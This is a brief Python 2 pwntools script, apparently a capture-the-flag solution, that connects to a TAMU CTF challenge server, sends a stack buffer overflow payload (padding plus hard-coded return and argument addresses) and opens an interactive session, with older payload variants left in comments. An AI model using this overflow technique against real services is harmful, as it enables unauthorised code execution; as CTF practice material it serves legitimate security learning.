from pwn import *



context.terminal = ['tmux','splitw','-h']

gdb_cmd = [

    "c"
]

p  = remote('pwn.ctf.tamu.edu',4324)
#p = process("./pwn4")

#gdb.attach(p, gdbscript = "\n".join(gdb_cmd))


#(python -c 'print "A"*23+ "\x11\xba\x07\xf0"')
#(python -c 'print "A"*243 + "\x4b\x85\x04\x08"')
#0xffffd56a



print p.recvuntil("Input> ")
buf = ""
p.sendline("a")
print p.recvuntil("Input> ")
buf += "A"*32
buf += "\x99\x85\x04\x08"
buf += "\x38\xa0\x04\x08"








p.sendline(buf)
p.interactive()
